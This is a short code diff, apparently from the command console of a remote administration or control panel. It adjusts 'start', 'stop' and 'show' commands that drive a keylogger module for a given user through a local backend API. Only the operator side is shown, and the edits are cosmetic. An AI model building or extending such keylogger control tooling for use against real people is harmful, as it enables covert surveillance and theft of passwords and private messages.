@@ -7,7 +7,7 @@ const start: Command = {
             addOutput("Starting keylogger for user: " + user.uuid);
             const response = await fetch("http://localhost:8000/api/modules/keylogger/start?id=" + user.uuid, { method: "POST" });
             const data = await response.json();
-            addOutput("Keylogger started: " + data.started);
+            addOutput("Keylogger started!");
         } catch (error) {
             console.error("Error starting keylogger:", error);
         }
@@ -19,9 +19,9 @@ const stop: Command = {
     execute: async (user, args, addOutput) => {
         try {
             addOutput("Stopping keylogger for user: " + user.uuid);
-            const response = await fetch("http://localhost:8000/api/modules/keylogger/stop?id=" + user.uuid);
+            const response = await fetch("http://localhost:8000/api/modules/keylogger/stop?id=" + user.uuid, { method: "POST" });
             const data = await response.json();
-            addOutput("Keylogger stopped: " + data.stopped);
+            addOutput("Keylogger stopped!");
         } catch (error) {
             console.error("Error stopping keylogger:", error);
         }
@@ -35,7 +35,7 @@ const show: Command = {
             addOutput("Fetching keylogger logs for user: " + user.uuid);
             const response = await fetch("http://localhost:8000/api/modules/keylogger/logs?id=" + user.uuid);
             const data = await response.json();
-            addOutput("Keylogger logs: " + data.logs);
+            addOutput(data.logs);
         } catch (error) {
             console.error("Error fetching keylogger logs:", error);
         }
